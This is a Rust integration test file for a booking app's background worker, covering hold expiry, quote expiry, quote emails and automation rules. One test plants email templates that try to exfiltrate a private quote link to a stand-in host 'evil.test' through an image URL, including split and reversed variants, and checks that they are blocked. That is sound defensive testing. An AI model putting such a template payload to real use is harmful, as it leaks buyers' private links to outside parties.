//! The bookings module's background work: holds lapsing, finished bookings
//! completing, quotes expiring, the quote email, and rules that make tasks
//! or fire on booking dates.

#![allow(clippy::unwrap_used, clippy::expect_used)]

#[path = "../../core-api/tests/common/mod.rs"]
mod common;

use std::sync::Arc;
use std::time::Duration;

use chrono::Utc;
use common::{Client, TestApp};
use core_integrations::http::WebhookClient;
use core_integrations::mail::MemoryMailer;
use core_worker::{Settings, Worker};
use serde_json::{Value, json};
use sqlx::PgPool;
use sqlx::postgres::PgPoolOptions;
use uuid::Uuid;

struct Harness {
    app: TestApp,
    worker: Worker,
    mailer: Arc<MemoryMailer>,
}

async fn harness(pool: PgPool) -> Harness {
    let app = TestApp::new(pool).await;
    let options = app.owner.connect_options().as_ref().clone();
    let queue = core_db::worker_pool_options(PgPoolOptions::new().max_connections(3))
        .connect_with(options)
        .await
        .unwrap();
    let mailer = Arc::new(MemoryMailer::default());
    let worker = Worker {
        app: app.state.clone(),
        queue,
        mailer: mailer.clone(),
        webhooks: WebhookClient::new(true).unwrap(),
        settings: Settings {
            concurrency: 4,
            backoff: |_| Duration::ZERO,
            ..Settings::default()
        },
    };
    Harness {
        app,
        worker,
        mailer,
    }
}

impl Harness {
    /// Publishes and runs until there is nothing left to do now.
    async fn drain(&self) {
        for _ in 0..50 {
            let published = self.worker.publish_once().await.unwrap();
            let ran = self.worker.run_jobs_once().await.unwrap();
            if published == 0 && ran == 0 {
                return;
            }
        }
        panic!("the queue did not settle");
    }

    /// Runs the scheduler and everything it queued.
    async fn tick(&self) {
        self.worker.schedule_once().await.unwrap();
        self.drain().await;
    }

    async fn post(&self, who: &Client, path: &str, body: Value) -> common::Resp {
        self.app
            .post(path)
            .signed_in(who)
            .json(body)
            .send()
            .await
            .ok()
    }

    async fn get(&self, who: &Client, path: &str) -> Value {
        self.app.get(path).signed_in(who).send().await.ok().body
    }

    async fn sql(&self, query: &'static str, id: Uuid) {
        sqlx::query(query)
            .bind(id)
            .execute(&self.app.owner)
            .await
            .unwrap();
    }

    async fn status(&self, who: &Client, kind: &str, id: Uuid) -> String {
        self.get(who, &format!("/api/v1/{kind}/{id}")).await["status"]
            .as_str()
            .unwrap()
            .to_owned()
    }

    async fn jobs(&self, kind: &str) -> i64 {
        sqlx::query_scalar("SELECT count(*) FROM jobs WHERE kind = $1")
            .bind(kind)
            .fetch_one(&self.app.owner)
            .await
            .unwrap()
    }
}

/// A workspace with a talent and a booker who has an email address.
async fn workspace(h: &Harness) -> (Client, Uuid, Uuid) {
    let (_, owner) = h.app.workspace_with_owner("acme").await;
    let talent = h
        .post(
            &owner,
            "/api/v1/talent",
            json!({ "name": "The Midnight Owls", "default_fee": { "minor": 200_000, "currency": "GBP" } }),
        )
        .await
        .id("/id");
    let contact = h
        .post(
            &owner,
            "/api/v1/contacts",
            json!({ "name": "Bea Booker", "emails": ["bea@grand.test"] }),
        )
        .await
        .id("/id");
    h.drain().await;
    (owner, talent, contact)
}

async fn booking(
    h: &Harness,
    owner: &Client,
    talent: Uuid,
    title: &str,
    status: &str,
    days: i64,
) -> Uuid {
    let starts = Utc::now() + chrono::Duration::days(days);
    h.post(
        owner,
        "/api/v1/bookings",
        json!({ "title": title, "talent_ids": [talent], "status": status,
                "starts_at": starts, "ends_at": starts + chrono::Duration::hours(4) }),
    )
    .await
    .id("/id")
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn holds_lapse_bookings_complete_and_quotes_expire(pool: PgPool) {
    let h = harness(pool).await;
    let (owner, talent, _) = workspace(&h).await;

    let lapsing = booking(&h, &owner, talent, "Lapsing hold", "hold", 30).await;
    let kept = booking(&h, &owner, talent, "Fresh hold", "hold", 31).await;
    let quoted = booking(&h, &owner, talent, "Quoted hold", "hold", 32).await;
    let past = booking(&h, &owner, talent, "Last week's gig", "confirmed", 40).await;
    let future = booking(&h, &owner, talent, "Next month's gig", "confirmed", 41).await;

    // A sent quote on the lapsing hold, and one on a hold that stays.
    let quote_on = |b: Uuid| {
        let h = &h;
        let owner = &owner;
        async move {
            let q = h
                .post(owner, &format!("/api/v1/bookings/{b}/quotes"), json!({}))
                .await
                .id("/id");
            h.post(
                owner,
                &format!("/api/v1/quotes/{q}/send"),
                json!({ "to": "bea@grand.test" }),
            )
            .await;
            q
        }
    };
    let withdrawn = quote_on(lapsing).await;
    let lapsed = quote_on(quoted).await;
    h.drain().await;

    // Time passes.
    h.sql(
        "UPDATE bookings SET hold_expires_at = now() - interval '1 minute' WHERE id = $1",
        lapsing,
    )
    .await;
    h.sql(
        "UPDATE bookings SET starts_at = now() - interval '7 days', ends_at = now() - interval '7 days' + interval '4 hours' WHERE id = $1",
        past,
    )
    .await;
    h.sql(
        "UPDATE quotes SET valid_until = current_date - 1 WHERE id = $1",
        lapsed,
    )
    .await;
    h.tick().await;

    assert_eq!(h.status(&owner, "bookings", lapsing).await, "expired");
    assert_eq!(h.status(&owner, "bookings", kept).await, "hold");
    assert_eq!(h.status(&owner, "bookings", quoted).await, "hold");
    assert_eq!(h.status(&owner, "bookings", past).await, "completed");
    assert_eq!(h.status(&owner, "bookings", future).await, "confirmed");
    assert_eq!(
        h.status(&owner, "quotes", withdrawn).await,
        "withdrawn",
        "a lapsed hold's quote goes with it"
    );
    assert_eq!(h.status(&owner, "quotes", lapsed).await, "expired");

    // Each change is on the record, made by the system.
    let ws = owner.workspace.unwrap();
    let actions = h.app.audit_actions(ws).await;
    for a in ["booking.expired", "booking.completed", "quote.expired"] {
        assert!(actions.contains(&a.to_owned()), "{a} in {actions:?}");
    }

    // Nothing is done twice.
    h.tick().await;
    assert_eq!(h.jobs("booking.expire_hold").await, 1);
    assert_eq!(h.jobs("booking.complete").await, 1);
    assert_eq!(h.jobs("quote.expire").await, 1);

    // A lapsed hold put back on gets a new expiry, and lapses again later.
    let again = h
        .post(
            &owner,
            &format!("/api/v1/bookings/{lapsing}/status"),
            json!({ "status": "hold" }),
        )
        .await;
    assert!(again.body["hold_expires_at"].is_string());
    h.sql(
        "UPDATE bookings SET hold_expires_at = now() - interval '1 minute' WHERE id = $1",
        lapsing,
    )
    .await;
    h.tick().await;
    assert_eq!(h.status(&owner, "bookings", lapsing).await, "expired");
    assert_eq!(h.jobs("booking.expire_hold").await, 2);

    // A hold confirmed before its job runs is left alone.
    h.sql(
        "UPDATE bookings SET hold_expires_at = now() - interval '1 minute' WHERE id = $1",
        kept,
    )
    .await;
    h.worker.schedule_once().await.unwrap();
    h.post(
        &owner,
        &format!("/api/v1/bookings/{kept}/status"),
        json!({ "status": "pending" }),
    )
    .await;
    h.drain().await;
    assert_eq!(h.status(&owner, "bookings", kept).await, "pending");
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn sending_a_quote_emails_the_buyer_a_link_to_it(pool: PgPool) {
    let h = harness(pool).await;
    let (owner, talent, contact) = workspace(&h).await;
    let starts = Utc::now() + chrono::Duration::days(60);
    let b = h
        .post(
            &owner,
            "/api/v1/bookings",
            json!({ "title": "Summer ball", "talent_ids": [talent], "contact_id": contact,
                    "starts_at": starts, "ends_at": starts + chrono::Duration::hours(4),
                    "venue_text": "The Grand Hall" }),
        )
        .await
        .id("/id");
    let q = h
        .post(
            &owner,
            &format!("/api/v1/bookings/{b}/quotes"),
            json!({ "message": "Lovely to hear from you." }),
        )
        .await
        .id("/id");
    let sent = h
        .post(&owner, &format!("/api/v1/quotes/{q}/send"), json!({}))
        .await;
    let link = sent.body["link"].as_str().unwrap().to_owned();
    h.drain().await;

    let mail = h
        .mailer
        .sent()
        .into_iter()
        .find(|m| m.to == "bea@grand.test")
        .expect("the quote email");
    assert_eq!(mail.subject, "Quote Q-0001 from acme agency: Summer ball");
    assert_eq!(mail.from_name.as_deref(), Some("acme agency"));
    let html = mail.html.unwrap();
    let token = link.rsplit('/').next().unwrap();
    assert!(html.contains(token), "{html}");
    assert!(
        html.contains("The Grand Hall") && html.contains("Lovely to hear from you."),
        "{html}"
    );
    assert!(html.contains("£2,000.00"), "{html}");

    // The link in the email opens the quote.
    let public = h
        .app
        .get(&format!("/api/v1/public/quotes/{token}"))
        .send()
        .await
        .ok();
    assert_eq!(public.body["reference"], "Q-0001");

    // The email is on the booking's contact's timeline.
    let timeline = h
        .get(&owner, &format!("/api/v1/contacts/{contact}/timeline"))
        .await;
    assert!(timeline.to_string().contains("Quote Q-0001"), "{timeline}");
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn a_custom_quote_template_cannot_leak_the_link(pool: PgPool) {
    let h = harness(pool).await;
    let (owner, talent, contact) = workspace(&h).await;
    // An admin's template tries to send the link off to another site: that
    // is refused when it is saved.
    h.app
        .post("/api/v1/templates")
        .signed_in(&owner)
        .json(json!({
            "kind": "email", "key": "system.quote", "name": "Quote",
            "subject": "Quote {{ quote.url }}",
            "body": "<p><a href=\"{{ quote.url }}\">See it</a></p>\
                     <img src=\"https://evil.test/?u={{ quote.url }}\">"
        }))
        .send()
        .await
        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");
    // One saved before that check (or slipping past it) still cannot carry
    // the link: the template only ever sees a stand-in for it.
    sqlx::query(
        "INSERT INTO templates (id, workspace_id, kind, key, locale, name, subject, body)
         SELECT gen_random_uuid(), id, 'email', 'system.quote', 'en', 'Quote', $1, $2
         FROM workspaces",
    )
    .bind("Quote {{ quote.url }}")
    .bind(
        "<p><a href=\"{{ quote.url }}\">See it</a></p>\
         <p>{{ quote.url[:20] }}<!---->{{ quote.url[20:] }}</p>\
         <p>{{ quote.url | reverse }}</p>\
         <img src=\"https://evil.test/?u={{ quote.url }}\">",
    )
    .execute(&h.app.owner)
    .await
    .unwrap();
    let starts = Utc::now() + chrono::Duration::days(60);
    let b = h
        .post(
            &owner,
            "/api/v1/bookings",
            json!({ "title": "Summer ball", "talent_ids": [talent], "contact_id": contact,
                    "starts_at": starts, "ends_at": starts + chrono::Duration::hours(4) }),
        )
        .await
        .id("/id");
    let q = h
        .post(&owner, &format!("/api/v1/bookings/{b}/quotes"), json!({}))
        .await
        .id("/id");
    let sent = h
        .post(&owner, &format!("/api/v1/quotes/{q}/send"), json!({}))
        .await;
    let link = sent.body["link"].as_str().unwrap().to_owned();
    let token = link.rsplit('/').next().unwrap().to_owned();
    h.drain().await;

    let mail = h
        .mailer
        .sent()
        .into_iter()
        .find(|m| m.to == "bea@grand.test")
        .expect("the quote email");
    let html = mail.html.unwrap();
    assert!(
        mail.subject.contains(&token) && html.contains(&format!("href=\"{link}\"")),
        "the buyer still gets a working link: {html}"
    );
    assert!(
        !html.replace(&link, "").contains(&token[..12]),
        "only as the link: {html}"
    );
    assert!(!html.contains("evil.test/?u=http"), "{html}");

    let stored: Vec<(String, String, String)> = sqlx::query_as(
        "SELECT coalesce(subject, ''), coalesce(body_html, ''), body_text FROM outbound_messages WHERE to_address = 'bea@grand.test'",
    )
    .fetch_all(&h.app.owner)
    .await
    .unwrap();
    assert_eq!(stored.len(), 1);
    for part in [&stored[0].0, &stored[0].1, &stored[0].2] {
        assert!(!part.contains(&token[..12]), "{part}");
    }
}

#[sqlx::test(migrator = "core_db::MIGRATOR")]
async fn rules_make_tasks_and_fire_on_booking_dates(pool: PgPool) {
    let h = harness(pool).await;
    let (owner, talent, _) = workspace(&h).await;
    let owner_id = h.app.user_id("owner@acme.test").await.0;
    h.post(
        &owner,
        "/api/v1/rules",
        json!({
            "name": "Contract on confirm",
            "trigger": { "kind": "event", "topic": "booking.confirmed" },
            "actions": [{ "type": "create_task", "title": "Send contract for {{ booking.title }}",
                          "due_in_minutes": 1440, "assignee_id": owner_id }]
        }),
    )
    .await;
    let reminder = h
        .post(
            &owner,
            "/api/v1/rules",
            json!({
                "name": "Call the venue a week before",
                "trigger": { "kind": "date_offset", "entity": "booking", "field": "starts_at",
                             "offset_minutes": -10080 },
                "conditions": { "field": "booking.status", "op": "eq", "value": "confirmed" },
                "actions": [{ "type": "create_task", "title": "Call the venue about {{ booking.title }}" }]
            }),
        )
        .await
        .id("/id");

    // A rule naming someone outside the workspace is refused.
    h.app
        .post("/api/v1/rules")
        .signed_in(&owner)
        .json(json!({
            "name": "Stranger",
            "trigger": { "kind": "event", "topic": "booking.confirmed" },
            "actions": [{ "type": "create_task", "title": "x", "assignee_id": Uuid::now_v7() }]
        }))
        .send()
        .await
        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");

    // Starts a week from now: the reminder is due as soon as the scheduler looks.
    let soon = booking(&h, &owner, talent, "Gala night", "confirmed", 7).await;
    let later = booking(&h, &owner, talent, "Christmas party", "confirmed", 60).await;
    let held = booking(&h, &owner, talent, "Pencilled", "hold", 7).await;
    h.drain().await;
    tokio::time::sleep(Duration::from_millis(20)).await;
    h.tick().await;

    let tasks = h.get(&owner, "/api/v1/tasks?status=all").await;
    let mut titles: Vec<&str> = tasks["items"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["title"].as_str().unwrap())
        .collect();
    titles.sort_unstable();
    assert_eq!(
        titles,
        [
            "Call the venue about Gala night",
            "Send contract for Christmas party",
            "Send contract for Gala night",
        ]
    );
    let contract = tasks["items"]
        .as_array()
        .unwrap()
        .iter()
        .find(|t| t["title"] == "Send contract for Gala night")
        .unwrap();
    assert_eq!(contract["origin"], "rule");
    assert_eq!(contract["assignee_id"], owner_id.to_string());
    assert_eq!(contract["related_entity"], "booking");
    assert_eq!(contract["related_id"], soon.to_string());
    assert!(contract["due_at"].is_string());
    let mine = h.get(&owner, "/api/v1/tasks?assignee=me").await;
    assert_eq!(mine["total"], 2);

    let runs: Vec<(String, Option<Uuid>)> =
        sqlx::query_as("SELECT outcome, object_id FROM rule_runs WHERE rule_id = $1 ORDER BY id")
            .bind(reminder)
            .fetch_all(&h.app.owner)
            .await
            .unwrap();
    // The date rule looked at both bookings starting in a week, acted on the
    // confirmed one, and left the one two months out for later.
    let mut runs: Vec<(String, Uuid)> = runs.into_iter().map(|(o, id)| (o, id.unwrap())).collect();
    runs.sort();
    assert_eq!(
        runs,
        [("acted".to_owned(), soon), ("skipped".to_owned(), held)]
    );
    assert!(!runs.iter().any(|(_, id)| *id == later));
}
